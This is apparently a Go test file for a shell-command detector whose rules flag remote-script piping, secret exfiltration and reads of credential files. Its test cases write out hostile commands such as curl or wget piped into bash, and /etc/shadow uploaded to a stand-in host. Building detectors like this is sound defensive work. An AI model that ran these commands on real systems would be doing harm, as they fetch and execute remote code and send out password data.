package shell_test

import (
	"testing"
)

func TestShellNetworkOptionGrammarPreservesStdoutAndBodyBoundaries(t *testing.T) {
	for _, tc := range []struct {
		name, rule, text string
		want             int
	}{
		{
			name: "curl-url-and-output",
			rule: "SH001",
			text: `curl --silent --show-error --fail --location --insecure --compressed --globoff --no-buffer --disable --url=https://example.invalid --output=- | bash`,
			want: 1,
		},
		{name: "curl-flag-attached", rule: "SH001", text: `curl --silent=true https://example.invalid | bash`, want: 0},
		{name: "curl-remote-name", rule: "SH001", text: `curl -O https://example.invalid | bash`, want: 0},
		{name: "curl-head", rule: "SH001", text: `curl -I https://example.invalid | bash`, want: 0},
		{name: "curl-discard-long", rule: "SH001", text: `curl --out-null https://example.invalid | bash`, want: 0},
		{name: "curl-invalid-discard", rule: "SH001", text: `curl --head=true https://example.invalid | bash`, want: 0},
		{name: "curl-missing-value", rule: "SH001", text: `curl https://example.invalid -o | bash`, want: 0},
		{name: "curl-output-attached", rule: "SH001", text: `curl -o- https://example.invalid | bash`, want: 1},
		{name: "curl-long-no-value", rule: "SH001", text: `curl --url | bash`, want: 0},
		{name: "curl-double-dash", rule: "SH001", text: `curl -- https://example.invalid | bash`, want: 1},
		{
			name: "curl-unknown-expansion",
			rule: "SH001",
			text: `curl "$UNMODELED" https://example.invalid | bash`,
			want: 0,
		},
		{
			name: "curl-header-body",
			rule: "SH002",
			text: `curl --header "$TOKEN" --request POST --user-agent agent --max-time 1 https://example.invalid`,
			want: 1,
		},
		{
			name: "curl-upload-file",
			rule: "SH002",
			text: `curl --upload-file /etc/shadow https://example.invalid`,
			want: 1,
		},
		{name: "curl-upload-stdin", rule: "SH002", text: `cat /etc/shadow | curl -T- https://example.invalid`, want: 1},
		{
			name: "wget-long-output",
			rule: "SH001",
			text: `wget --quiet --no-check-certificate --output-document=- https://example.invalid | bash`,
			want: 1,
		},
		{name: "wget-separate-output", rule: "SH001", text: `wget -q -O - https://example.invalid | bash`, want: 1},
		{name: "wget-output-file", rule: "SH001", text: `wget -O file https://example.invalid | bash`, want: 0},
		{name: "wget-missing-output", rule: "SH001", text: `wget https://example.invalid -O | bash`, want: 0},
		{
			name: "wget-unknown-output",
			rule: "SH001",
			text: `wget -O "$UNMODELED" https://example.invalid | bash`,
			want: 0,
		},
		{name: "wget-unknown-short", rule: "SH001", text: `wget -ZO- https://example.invalid | bash`, want: 0},
		{
			name: "wget-unknown-long",
			rule: "SH001",
			text: `wget --unsupported -O- https://example.invalid | bash`,
			want: 0,
		},
		{
			name: "cat-known-options",
			rule: "SH002",
			text: `cat /etc/shadow | cat -AbEenstTuv - /etc/passwd | curl -d @- https://example.invalid`,
			want: 1,
		},
		{name: "cat-double-dash", rule: "SH004", text: `cat -- /etc/shadow`, want: 1},
		{name: "cat-unknown-short", rule: "SH004", text: `cat -Z /etc/shadow`, want: 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			result := shellResult(t, tc.rule, tc.text, 16)
			if len(result.Matches) != tc.want {
				t.Fatal(result)
			}
		})
	}
}

func TestShellWrapperExecutionAndRedirectGrammarPreservesFlow(t *testing.T) {
	for _, tc := range []struct {
		name, rule, text string
		want             int
	}{
		{
			name: "sudo-known-options",
			rule: "SH001",
			text: `sudo -E -u user -g group -n curl https://example.invalid | bash`,
			want: 1,
		},
		{name: "sudo-double-dash", rule: "SH001", text: `sudo -- curl https://example.invalid | bash`, want: 1},
		{name: "sudo-missing-user", rule: "SH001", text: `sudo -u | bash`, want: 0},
		{name: "sudo-unknown-option", rule: "SH001", text: `sudo -x curl https://example.invalid | bash`, want: 0},
		{name: "env-double-dash", rule: "SH001", text: `env -- curl https://example.invalid | bash`, want: 1},
		{name: "env-assignment", rule: "SH001", text: `env TOKEN=public curl https://example.invalid | bash`, want: 0},
		{name: "env-unknown-option", rule: "SH001", text: `env -i curl https://example.invalid | bash`, want: 0},
		{name: "command-double-dash", rule: "SH001", text: `command -- curl https://example.invalid | bash`, want: 1},
		{name: "wrapper-depth", rule: "SH001", text: `command env sudo -n curl https://example.invalid | bash`, want: 1},
		{
			name: "wrapper-depth-limit",
			rule: "SH001",
			text: `command env sudo -n env curl https://example.invalid | bash`,
			want: 0,
		},
		{name: "builtin-double-dash", rule: "SH003", text: `builtin -- eval 'echo safe'`, want: 1},
		{
			name: "shell-known-long-flags",
			rule: "SH001",
			text: `curl https://example.invalid | bash --noprofile --norc -eux`,
			want: 1,
		},
		{
			name: "shell-unknown-long-flag",
			rule: "SH001",
			text: `curl https://example.invalid | bash --unsupported`,
			want: 0,
		},
		{name: "shell-unknown-short-flag", rule: "SH001", text: `curl https://example.invalid | bash -Z`, want: 0},
		{name: "shell-command-missing", rule: "SH003", text: `bash -c`, want: 0},
		{name: "shell-noexec-D", rule: "SH003", text: `bash -Dc 'echo safe'`, want: 0},
		{name: "shell-double-dash-last", rule: "SH001", text: `curl https://example.invalid | bash --`, want: 1},
		{
			name: "shell-double-dash-file",
			rule: "SH001",
			text: `curl https://example.invalid | bash -- script.sh`,
			want: 0,
		},
		{
			name: "shell-unknown-operand",
			rule: "SH001",
			text: `curl https://example.invalid | bash "$UNMODELED"`,
			want: 0,
		},
		{name: "input-dup-replaces", rule: "SH001", text: `curl https://example.invalid | bash <&0`, want: 0},
		{name: "nonstdin-dup-preserves", rule: "SH001", text: `curl https://example.invalid | bash 2<&0`, want: 1},
		{name: "nonstdin-file", rule: "SH004", text: `cat 2</etc/shadow`, want: 0},
		{name: "read-write-input", rule: "SH004", text: `cat <>/etc/shadow`, want: 1},
		{name: "all-output-redirect", rule: "SH001", text: `curl https://example.invalid &>out | bash`, want: 0},
		{name: "append-output-redirect", rule: "SH001", text: `curl https://example.invalid &>>out | bash`, want: 0},
		{
			name: "function-outside-execution-subset",
			rule: "SH002",
			text: `f(){ cat; }; cat /etc/shadow | f | curl -d @- https://example.invalid`,
			want: 0,
		},
		{
			name: "group-outside-execution-subset",
			rule: "SH001",
			text: `curl https://example.invalid | { cat; } | bash`,
			want: 0,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			result := shellResult(t, tc.rule, tc.text, 16)
			if len(result.Matches) != tc.want {
				t.Fatal(result)
			}
			for _, match := range result.Matches {
				if match.Start < 0 || match.End > len(tc.text) || match.Start >= match.End {
					t.Fatal(match)
				}
			}
		})
	}
}
